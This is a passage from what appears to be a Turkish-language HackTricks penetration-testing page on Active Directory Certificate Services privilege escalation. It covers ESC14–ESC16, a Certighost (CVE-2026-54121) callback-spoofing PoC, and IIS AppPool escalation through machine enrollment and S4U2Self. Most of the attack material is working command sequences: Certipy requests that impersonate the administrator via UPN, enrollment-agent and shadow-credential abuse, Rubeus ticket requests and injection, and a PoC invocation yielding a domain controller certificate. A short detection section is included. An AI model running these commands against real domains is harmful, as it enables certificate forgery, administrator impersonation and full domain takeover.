- **Ön koşul**: Hedefin `altSecurityIdentities` içinde zayıf bir X509SubjectOnly açık eşlemesi vardır. Saldırgan, bir kurban principal üzerindeki `cn` veya `dNSHostName` özniteliğini hedefin X509SubjectOnly eşlemesinin subject değeriyle eşleşecek şekilde ayarlayabilir. Ardından saldırgan kurban olarak sertifika alabilir ve bu sertifikayı hedef adına kimlik doğrulamak için kullanabilir.
### Somut işlemler
#### Senaryo A

`Machine` sertifika şablonundan bir sertifika isteyin.

```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```

 Sertifikayı kaydedin ve dönüştürün

```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```

 Kimlik doğrula (sertifikayı kullanarak)

```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```

Temizleme (isteğe bağlı)

```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```

Çeşitli saldırı senaryolarındaki daha spesifik saldırı yöntemleri için lütfen şuraya bakın: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).<sup>[[13]](#references)</sup>

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Açıklama

[Orijinal ESC15 araştırması](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc), V1 template için yapılan bir istekte belirtilen application policies değerlerinin, **yaması uygulanmamış bir issuing CA** üzerindeki yapılandırılmış Extended Key Usage değerini nasıl geçersiz kılabileceğini açıklıyor.<sup>[[15]](#references)</sup> Adayın ayrıca gerekli subject/request özelliklerine izin veren ve engelleyici bir onay veya imza gereksinimi olmayan, yayımlanmış ve enroll edilebilir bir template'e ihtiyacı vardır. Yalnızca enrollment haklarına sahip olmak, istismarın mümkün olduğunu kanıtlamaz. Certificate Request Agent kullanımı ayrıca uygun bir ikinci template'e ve enrollment-agent kısıtlamalarına bağlı olabilir; bu yolu öne sürmeden önce CA yama durumunu ve sertifika çıkarma sonucunu doğrulayın.

### İstismar

[Certipy privilege-escalation dokümantasyonunda](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) daha ayrıntılı kullanım örnekleri bulunur.<sup>[[14]](#references)</sup>


Certipy'nin `find` komutu, CA'ya yama uygulanmamışsa ESC15'e karşı potansiyel olarak savunmasız olan V1 template'leri belirlemeye yardımcı olabilir.

```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```

#### Senaryo A: Schannel üzerinden Doğrudan Taklit

**Adım 1: "Client Authentication" Application Policy ve hedef UPN'yi ekleyerek sertifika isteyin.** Saldırgan `attacker@corp.local`, kayıt sahibinin konu bilgisini belirlemesine izin veren "WebServer" V1 şablonunu kullanarak `administrator@corp.local` hesabını hedef alır.

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'WebServer' \
    -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
    -application-policies 'Client Authentication'
```

- `-template 'WebServer'`: "Enrollee supplies subject" özelliğine sahip savunmasız V1 şablonu.
- `-application-policies 'Client Authentication'`: CSR'nin Application Policies uzantısına `1.3.6.1.5.5.7.3.2` OID'sini ekler.
- `-upn 'administrator@corp.local'`: Taklit için SAN'deki UPN'yi ayarlar.

**Adım 2: Elde edilen sertifikayı kullanarak Schannel (LDAPS) üzerinden kimlik doğrulayın.**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```

#### Senaryo B: Enrollment Agent Abuse ile PKINIT/Kerberos Impersonation

**Adım 1: "Enrollee supplies subject" ayarına sahip bir V1 template'ten, "Certificate Request Agent" Application Policy'sini ekleyerek sertifika isteyin.** Bu sertifika, saldırganın (`attacker@corp.local`) bir enrollment agent olması içindir. Amaç agent yeteneği olduğundan, saldırganın kendi kimliği için burada UPN belirtilmez.

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'WebServer' \
    -application-policies 'Certificate Request Agent'
```

- `-application-policies 'Certificate Request Agent'`: `1.3.6.1.4.1.311.20.2.1` OID'sini ekler.

**Adım 2: "agent" sertifikasını kullanarak hedef ayrıcalıklı kullanıcı adına bir sertifika isteyin.** Bu, 1. Adım'daki sertifikanın agent sertifikası olarak kullanıldığı, ESC3 benzeri bir adımdır.

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'User' \
    -pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```

**Adım 3: "on-behalf-of" sertifikasını kullanarak ayrıcalıklı kullanıcı olarak kimlik doğrulayın.**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```

## CA'de Güvenlik Uzantısı Devre Dışı (Genel)-ESC16

### Açıklama

**ESC16 (szOID_NTDS_CA_SECURITY_EXT Uzantısının Eksikliği Yoluyla Yetki Yükseltme)**, **szOID_NTDS_CA_SECURITY_EXT** SID uzantısının CA genelinde devre dışı bırakılmasını ifade eder. Bu, bir yapılandırma göstergesidir; bir sertifikanın başka bir hesap olarak kimlik doğrulaması yapabildiğinin kanıtı değildir. Kimliğe bürünmek için ilgili hesap öznitelikleri veya eşlemesi üzerinde denetim, kayıt olunabilir bir istemci kimlik doğrulama şablonu ve gerçek etki alanı denetleyicisi veya hizmet tarafından kabul edilen bir sertifika eşleme yolu da gerekir. Full Enforcement modundaki yamalı bir KDC, başka bir güçlü eşlemesi olmayan SID uzantısız sertifikaları reddeder; aşağıdaki yalnızca UPN kullanan Kerberos prosedürü, zayıf eşlemeyi hâlâ kabul eden eski veya uyumluluk modundaki KDC'ler için geçerlidir. Bkz. [Microsoft'un sertifika eşleme ve zorunlu kılma kılavuzu](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

Ayrıntılı ilke hakkında daha fazla bilgi edinmek için bu makaleye de başvurabilirsiniz:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### İstismar

Aşağıdaki tarihsel, yalnızca UPN kullanan Kerberos örneği [Certipy'nin ESC16 belgelerine](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally) dayanmaktadır. Sonuçta oluşan zayıf eşlemeyi hâlâ kabul eden bir KDC gerektirir; `StrongCertificateBindingEnforcement=1`, 9 Eylül 2025 tarihli Windows güvenlik güncellemesinden sonra artık desteklenen bir geçersiz kılma seçeneği değildir.<sup>[[14]](#references)</sup>

Active Directory Certificate Services (AD CS) ortamının **ESC16**'ya karşı savunmasız olup olmadığını belirlemek için-

```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```

**Adım 1: Kurban hesabının başlangıç UPN'sini oku (İsteğe bağlı - geri yükleme için).  **  


```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -user 'victim' \
    read
```

**Adım 2: Kurban hesabının UPN değerini hedef yöneticinin `sAMAccountName` değeriyle güncelleyin.  

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -upn 'administrator' \
    -user 'victim' update
```

**Adım 3: ("victim" hesabı için kimlik bilgilerini edinin (gerekirse; ör. Shadow Credentials aracılığıyla).**

```shell
certipy shadow \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -account 'victim' \
    auto
```

**Adım 4: ESC16 yapılandırılmış CA'de hesabın kayıt olabildiği bir client-authentication şablonundan (ör. "User") "kurban" kullanıcı olarak sertifika isteyin.** CA, verilen sertifikadan SID security extension'ı çıkarır; ancak bu tek başına kullanılabilir bir kimlik doğrulama eşlemesi oluşturmaz. Kerberos credential cache ortam değişkenini ayarlayın (shell komutu):

```bash
export KRB5CCNAME=victim.ccache
```

Ardından sertifikayı isteyin:

```bash
certipy req \
    -k -dc-ip '10.0.0.100' \
    -target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
    -template 'User'
```

**Adım 5: "victim" hesabının UPN'sini eski haline döndürün.**

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -upn 'victim@corp.local' \
    -user 'victim' update
```

**Adım 6: Bu zayıf eşleştirmeyi kabul eden eski veya uyumluluk modundaki KDC'de hedef yönetici olarak kimlik doğrulaması yapın.**

```bash
certipy auth \
    -dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
    -username 'administrator' -domain 'corp.local'
```

## Rogue LDAP/LSA chase callback identity substitution (Certighost / CVE-2026-54121)

### Açıklama

**Certighost**, CA'nın verilen sertifikaya yerleştirilecek kimliği belirlemek için istekte bulunan kişinin sağladığı istek özniteliklerine güvendiği bir **AD CS enrollment chase / callback path**'ini kötüye kullanır. Açık PoC'de hazırlanan istek şunları içerir:<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`**: CA'nın bağlantı kuracağı, saldırganın kontrolündeki host/IP
- **`rmd`**: kimliğine bürünülecek **hedef Domain Controller DNS adı**

CA bu chase'i izlerse, saldırgana **SMB/LSA (`445`)** ve **LDAP (`389`)** üzerinden bağlanır. Saldırgan, callback oturumunun geçerli bir domain principal olarak kimlik doğrulaması yapması için **gerçek bir machine account** kullanır (genellikle varsayılan **`ms-DS-MachineAccountQuota`** aracılığıyla oluşturulur); ancak sahte servisler bunun yerine **hedef DC'nin** kimlik özniteliklerini döndürür:

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

CA, döndürülen kimliği kimliği doğrulanmış callback principal'ına **kriptografik olarak bağlamıyorsa**, oturum saldırganın kontrolündeki machine account olarak kimlik doğrulaması yapmış olsa bile **Domain Controller** için sertifika verebilir. Bu hata kavramsal olarak **Certifried**'dan farklıdır: saldırgan, `dNSHostName` gibi AD özniteliklerini yeniden yazmak yerine, **CA callback çözümlemesi sırasında kimlik verilerini değiştirir**.<sup>[[2]](#references)</sup>

**Gerekli koşullar:**

- Düşük ayrıcalıklı **domain kimlik bilgileri**
- Bir computer account **oluşturma veya yeniden kullanma** olanağı
- **CA**'dan saldırganın kontrolündeki `389` ve `445` **portlarına** ağ erişimi
- Güvenlik açığı bulunan / yamalanmamış CA istek yolu (**14 Temmuz 2026** tarihli Microsoft güncellemesi, **`cdc` için DC doğrulaması** ve **çözümlenen SID karşılaştırması** ekledi)

Ortaya çıkan **`.pfx`**, daha sonra **PKINIT** için kullanılabilir; böylece bir **`.ccache`** ve yayımlanan PoC akışında **hedef DC'nin NT hash'i** elde edilir. Bu, normalde **domain'in tamamını ele geçirmek** için yeterlidir.

### İstismar

Açık PoC tüm zinciri otomatikleştirir:<sup>[[1]](#references)</sup>

1. Saldırganın kontrolündeki bir **machine account** oluşturun veya yeniden kullanın.
2. `389` ve `445` portlarında **sahte LDAP ve SMB/LSA listener'ları** başlatın.
3. Saldırganın kontrolündeki **`cdc`** ve hedef **`rmd`** özniteliklerini içeren bir sertifika isteği gönderin.
4. CA'nın kontrollü machine account olarak sahte listener'lara kimlik doğrulaması yapmasını sağlayın; ancak kimlik sorgularına **hedef DC** öznitelikleriyle yanıt verin.
5. CA tarafından imzalanmış bir **DC sertifikası** alın ve ardından bunu **PKINIT** için kullanın.

```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```

PoC'deki kullanışlı çalışma zamanı bayrakları:

- `--listener <ip>`: `cdc` içinde duyurulan callback IP'sini açıkça seçer
- `--computer-name <NAME$>`: yeni bir makine hesabı oluşturmak yerine mevcut bir makine hesabını kullanır

**Operasyonel notlar:**

- PoC, **ayrıcalıklı portlara** `389` ve `445` bağlandığı için **root** gerektirir.
- Başarılı exploitation, yerel olarak bir **DC `.pfx`** ve **Kerberos `.ccache`** yazar.
- Sertifika bir **Domain Controller hesabına** eşlendiğinden, sonraki adımlar arasında **certificate-based Kerberos auth**, **DCSync** ve kurtarılan **machine NT hash** değerinin yeniden kullanılması bulunabilir.<sup>[[2]](#references)</sup>

## IIS AppPool makine kaydıyla aynı ana makinede Administrator yetkisine yükselme

`ApplicationPoolIdentity` olarak çalışan bir IIS pool, ağ kaynaklarına erişirken giden bağlantılarda ana makinesinin **computer account** hesabını kullanır. Bu nedenle, `IIS AppPool\<POOL>` olarak code execution yerel token'da düşük ayrıcalıklı kalır; ancak CA'nın `HOST$` olarak kimlik doğrulaması yaptığı bir AD CS isteği gönderebilir. Bu, token impersonation veya Potato tarzı yerel bir yetki yükseltme değil, giden kimlik geçişidir.<sup>[[19]](#references)[[20]](#references)</sup>

Bu zincir için domain'e katılmış bir IIS ana makinesi, RPC üzerinden erişilebilen bir Enterprise CA, bilgisayarın enrollment haklarına sahip olduğu yayımlanmış bir machine-authentication template, PKINIT desteği ve KDC/SMB erişimi gerekir. Özel bir pool identity, giden principal'ı değiştirdiğinden `HOST$` olduğunu varsaymadan önce pool'un gerçekten `ApplicationPoolIdentity` kullandığını doğrulayın.<sup>[[19]](#references)[[20]](#references)</sup>

### Saldırganın kontrolündeki anahtarla kayıt

Anahtar çiftini ve CSR'yi IIS sunucusunun dışında oluşturun ve private key'i saklayın. Ele geçirilmiş worker üzerinden **yalnızca CSR'yi** gönderin. [Certi-Bhai ASPX PoC](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx), `CertificateAuthority.Request` örneğini oluşturur, `CertificateTemplate:Machine` ayarını yapar, `ICertRequest::Submit` çağrısını yapar ve verilen sertifikayı döndürür. `CAHOST\CA-NAME` CA yapılandırma dizesini kullanın; normal bir `Machine` template, subject'i AD'den oluşturduğundan istekte bulunanın subject/SAN verilerini sağlaması gerekmez.<sup>[[18]](#references)[[19]](#references)[[21]](#references)</sup>

Döndürülen sertifikayı **eşleşen, saklanmış key** ile birleştirin. `certutil -MergePFX machine_cert.cer machine_cert.pfx` yalnızca Windows sertifikayı erişilebilir bir private key ile zaten ilişkilendirebiliyorsa çalışır; ayrı PEM dosyaları için PKCS#12'yi açıkça oluşturun:<sup>[[19]](#references)[[23]](#references)</sup>

```bash
openssl pkcs12 -export -in machine_cert.cer -inkey machine_cert.key \
  -out machine_cert.pfx -name 'HOST$'
```

PFX'i PKINIT için kullanın ve döndürülen bilgisayar TGT'sini hemen enjekte etmek yerine base64 biçiminde saklayın:<sup>[[5]](#references)[[19]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:HOST$ /domain:DOMAIN /certificate:machine_cert.pfx `
  /password:PFX_PASSWORD /nowrap
```

### S4U2Self plus aynı ana bilgisayardaki hizmet ikamesi

S4U2Self, bir hizmetin başka bir kullanıcının yetkilendirme verilerini içeren **kendisine yönelik** bir ticket almasını sağlar. Bilgisayar TGT'siyle Rubeus, ayrıcalıklı bir kullanıcı için bu ticket'ı isteyebilir, döndürülen KRB-CRED içindeki hizmet adını CIFS olarak değiştirebilir ve ticket'ı enjekte edebilir. Bu, yerel “kendine delege et” ilkelidir: S4U2Proxy veya `msDS-AllowedToDelegateTo` girdisi gerektirmez.<sup>[[5]](#references)[[17]](#references)[[22]](#references)</sup>

```powershell
Rubeus.exe s4u /self /impersonateuser:Administrator `
  /altservice:cifs/HOST.DOMAIN /ticket:BASE64_MACHINE_TGT /ptt /nowrap

klist
dir \\HOST.DOMAIN\C$
```

Yerine konan ticket yalnızca **aynı bilgisayar hesabındaki/anahtarındaki** hizmetler tarafından kullanılabilir (burada, `HOST` üzerindeki CIFS). Bu, diğer etki alanı makinelerinde kullanılabilen yeniden kullanılabilir bir Administrator ticket değildir. Ayrıca gösterilen sonuç, Administrator olarak ayrıcalıklı SMB/dosya sistemi erişimidir; yerel bir `NT AUTHORITY\SYSTEM` işlemi elde etmek için yine de ayrı bir uzaktan çalıştırma adımı gerekir.<sup>[[5]](#references)[[17]](#references)[[19]](#references)</sup>

### Tespit ve güvenliği güçlendirme

- CA üzerinde, IIS sunucu hesaplarının beklenmedik `Machine` şablonu istekleri için Certification Services **4886** (istek alındı) ve **4887** (sertifika verildi) olaylarını ilişkilendirin.<sup>[[19]](#references)[[24]](#references)</sup>
- DC’lerde, sertifika ön kimlik doğrulaması kullanıldığında **4768** olayı sertifika alanlarını içerir; web sunucusu hesaplarına yönelik olağandışı PKINIT TGT istekleri için uyarı oluşturun. Ardından, ayrıcalıklı bir taklit edilen kimliği ve aynı ana bilgisayarı içeren **4769** isteklerini inceleyin. Rubeus `/altservice` KRB-CRED hizmet adını istemci tarafında yeniden yazdığından, DC tarafındaki 4769 hizmet adının `cifs` olmasını şart koşmayın.<sup>[[5]](#references)[[25]](#references)[[26]](#references)</sup>
- `w3wp.exe` işleminin CA RPC uç noktalarına erişmesini, beklenmedik ASPX oluşturulmasını, Kerberos kimlik doğrulamalı yönetim paylaşımlarına erişimi ve sırları dökme faaliyetlerini araştırın. Mümkün olduğunda uygulama katmanının CA RPC/KDC/SMB erişimini kısıtlayın ve operasyonel olarak gerekli olmayan bilgisayar kaydı haklarını veya makine kimlik doğrulama şablonlarını kaldırın.<sup>[[19]](#references)</sup>

## Sertifikalarla Ormanların Ele Geçirilmesinin Edilgen Çatıyla Açıklanması

### Ele Geçirilmiş CA’lar Tarafından Orman Güvenlerinin Kırılması

**Ormanlar arası kayıt** yapılandırması görece basit hâle getirilmiştir. Kaynak ormandaki **kök CA sertifikası**, yöneticiler tarafından **hesap ormanlarında yayımlanır** ve kaynak ormandaki **kurumsal CA** sertifikaları her hesap ormanındaki `NTAuthCertificates` ve AIA kapsayıcılarına **eklenir**. Açıklamak gerekirse bu düzenleme, kaynak ormandaki **CA’ya PKI’yi yönettiği diğer tüm ormanlar üzerinde tam denetim verir**. Bu CA’nın **saldırganlar tarafından ele geçirilmesi durumunda**, hem kaynak hem de hesap ormanlarındaki tüm kullanıcılar için sertifikalar **saldırganlar tarafından sahte olarak oluşturulabilir** ve böylece ormanın güvenlik sınırı kırılabilir.<sup>[[6]](#references)</sup>

### Yabancı Sorumlulara Verilen Kayıt Ayrıcalıkları

Çok ormanlı ortamlarda, **Authenticated Users veya yabancı sorumlulara** (kurumsal CA’nın ait olduğu ormanın dışındaki kullanıcılar/gruplar) **kayıt ve düzenleme hakları** veren sertifika şablonlarını **yayımlayan** Enterprise CA’lar konusunda dikkatli olunmalıdır.\
Bir güven ilişkisi üzerinden kimlik doğrulaması yapıldığında, AD kullanıcının token’ına **Authenticated Users SID**’sini ekler. Bu nedenle, bir etki alanında **Authenticated Users’a kayıt hakları veren** şablona sahip bir Enterprise CA varsa, başka bir ormandaki kullanıcı bu şablona **kayıt olabilir**. Benzer şekilde, bir şablonla **yabancı bir sorumluya açıkça kayıt hakları verilirse**, böylece **ormanlar arası bir erişim denetimi ilişkisi oluşturulur** ve bir ormandaki sorumlunun başka bir ormandaki şablona **kaydolması** mümkün hâle gelir.

Her iki senaryo da bir ormandan diğerine **saldırı yüzeyinin genişlemesine** yol açar. Sertifika şablonunun ayarları, saldırgan tarafından yabancı bir etki alanında ek ayrıcalıklar elde etmek için istismar edilebilir.<sup>[[6]](#references)</sup>


## References

- [1] [aniqfakhrul/CVE-2026-54121 PoC repository](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n - Certighost teknik analizi](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps – Certified Pre-Owned: Active Directory Certificate Services’in Kötüye Kullanılması](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak – Certipy 4.0: ESC9, ESC10, BloodHound GUI, Yeni Kimlik Doğrulama ve İstek Yöntemleri ve Daha Fazlası](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps – Shadow Credentials: Hesap Ele Geçirme için Key Trust Account Mapping’in Kötüye Kullanılması](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy – Enhanced Key (mis)Usage Öyküsü](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security – AD Certificate Services’e RPC Üzerinden Relay](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo – ESC12: YubiHSM ile ADCS CA’ya Shell Erişimi](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps – ADCS ESC13 Kötüye Kullanım Tekniği](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps – ADCS ESC14 Kötüye Kullanım Tekniği](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Certipy Wiki – Ayrıcalık Yükseltme (ESC1-ESC17)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec – EKUwu: Sıradan Bir AD CS ESC’den Daha Fazlası](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 – AD CS ESC16: Hatalı Yapılandırma ve İstismar](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)
- [17] [Charlie Clark – “Delegate 2 Thyself” Tekrar Ele Alınıyor](https://exploit.ph/revisiting-delegate-2-thyself.html)
- [18] [incredibleindishell/Certi-Bhai – IIS AD CS kayıt PoC’si](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx)
- [19] [Mannu Linux – AD CS RPC Endpoint’i Üzerinden IIS AppPool’dan Ayrıcalık Yükseltme](https://mannulinux.org/2026/08/Privilege-escalation-from-IIS-AppPool-to-NT-AuthoritySYSTEM-via-AD-CS-RPC-endpoint.html)
- [20] [Microsoft – Application Pool Kimlikleri](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)
- [21] [Microsoft – ICertRequest::Submit](https://learn.microsoft.com/en-us/windows/win32/api/certcli/nf-certcli-icertrequest-submit)
- [22] [Microsoft Open Specifications – S4U2self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13)
- [23] [OpenSSL – pkcs12 komutu](https://docs.openssl.org/3.6/man1/openssl-pkcs12/)
- [24] [Microsoft – Certification Services Denetimi](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/audit-certification-services)
- [25] [Microsoft – Olay 4768: Kerberos kimlik doğrulama ticket’ı istendi](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [26] [Microsoft – Olay 4769: Kerberos hizmet ticket’ı istendi](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
- [27] [incredibleindishell/Certi-Bhai – AD CS PowerShell istismar araç seti](https://github.com/incredibleindishell/Certi-Bhai)
{{#include ../../../banners/hacktricks-training.md}}
